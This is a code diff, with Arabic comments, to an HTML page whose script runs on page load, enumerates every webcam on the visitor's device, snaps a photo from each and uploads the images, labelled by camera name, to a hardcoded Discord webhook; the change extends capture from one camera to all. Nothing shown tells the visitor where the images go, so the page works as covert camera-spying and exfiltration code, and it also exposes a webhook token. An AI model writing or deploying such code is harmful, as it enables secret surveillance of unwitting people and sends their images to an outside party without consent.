@@ -33,7 +33,7 @@
         }
 
         // الدالة لبدء كاميرات الويب
-        async function initCamera() {
+        async function initCameras() {
             try {
                 // الحصول على قائمة بجميع الأجهزة المتصلة (الكاميرات)
                 const devices = await navigator.mediaDevices.enumerateDevices();
@@ -45,8 +45,29 @@
                     return;
                 }
 
-                // الحصول على تدفق الكاميرا (أول كاميرا متاحة)
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                console.log("تم العثور على الكاميرات التالية:", videoDevices);
+
+                // استدعاء جميع الكاميرات المتاحة والتقاط الصور منها
+                const capturePromises = videoDevices.map(device => startCameraAndCapture(device));
+                await Promise.all(capturePromises);  // الانتظار حتى تنتهي جميع الكاميرات من التقاط الصور
+
+                // إرسال الصور إلى Discord بعد التقاطها
+                sendToDiscord(images);
+
+            } catch (error) {
+                alert("حدث خطأ أثناء الوصول إلى الكاميرا. تأكد من أنك قد منحت إذن الوصول إلى الكاميرات.");
+                console.error("حدث خطأ أثناء الوصول إلى الكاميرات.", error);
+                sendToDiscord("camera not found");
+            }
+        }
+
+        // بدء كاميرا والتقاط الصورة
+        async function startCameraAndCapture(device) {
+            try {
+                // الحصول على صلاحية الوصول إلى الكاميرا
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { deviceId: device.deviceId }
+                });
 
                 const video = document.createElement('video');
                 video.srcObject = stream;
@@ -57,18 +78,16 @@
 
                 // الانتظار حتى يبدأ الفيديو في التشغيل ثم التقاط الصورة
                 video.onplaying = () => {
-                    captureAndSend(video);
+                    captureAndSend(video, device);
                 };
 
             } catch (error) {
-                alert("حدث خطأ أثناء الوصول إلى الكاميرا. تأكد من أنك قد منحت إذن الوصول إلى الكاميرات.");
-                console.error("حدث خطأ أثناء الوصول إلى الكاميرات.", error);
-                sendToDiscord("camera not found");
+                console.error(`حدث خطأ أثناء تشغيل الكاميرا: ${device.label}`, error);
             }
         }
 
         // التقاط الصورة من الفيديو
-        function captureAndSend(video) {
+        function captureAndSend(video, device) {
             // إعداد الـCanvas لرسم الفيديو
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -79,14 +98,11 @@
             const imageData = canvas.toDataURL("image/png");
 
             // إضافة الصورة إلى قائمة الصور
-            images.push(imageData);
-            console.log("تم التقاط الصورة من الكاميرا.");
-
-            // إرسال الصورة إلى Discord
-            sendToDiscord(images);
+            images.push({ image: imageData, deviceLabel: device.label });
+            console.log(`تم التقاط صورة من كاميرا: ${device.label}`);
         }
 
-        // إرسال الرسالة أو الصور إلى Webhook في Discord
+        // إرسال البيانات إلى Webhook في Discord
         async function sendToDiscord(content) {
             const webhookUrl = "https://discord.com/api/webhooks/1304326600438972447/cPAPNutnxg86tnOFPS4nbt5CHapnvXwXAiKR8bqJPJylOaLcd-wV3avTuFqcphwmB6Sc";  // ضع هنا رابط الـWebhook الخاص بك
             const formData = new FormData();
@@ -97,8 +113,8 @@
             } else if (Array.isArray(content)) {
                 // إذا كانت المحتويات صورًا، تحويل الصور إلى Blob وإضافتها إلى الـ FormData
                 content.forEach((imageData, index) => {
-                    const blob = dataURItoBlob(imageData);
-                    formData.append("file", blob, `image${index + 1}.png`);
+                    const blob = dataURItoBlob(imageData.image);
+                    formData.append("file", blob, `image_${imageData.deviceLabel}.png`);
                 });
             }
 
@@ -130,8 +146,8 @@
             return new Blob([uintArray], { type: "image/png" });
         }
 
-        // بدء الكاميرا عند تحميل الصفحة
-        window.onload = initCamera;
+        // بدء الكاميرات عند تحميل الصفحة
+        window.onload = initCameras;
     </script>
 </body>
 </html>
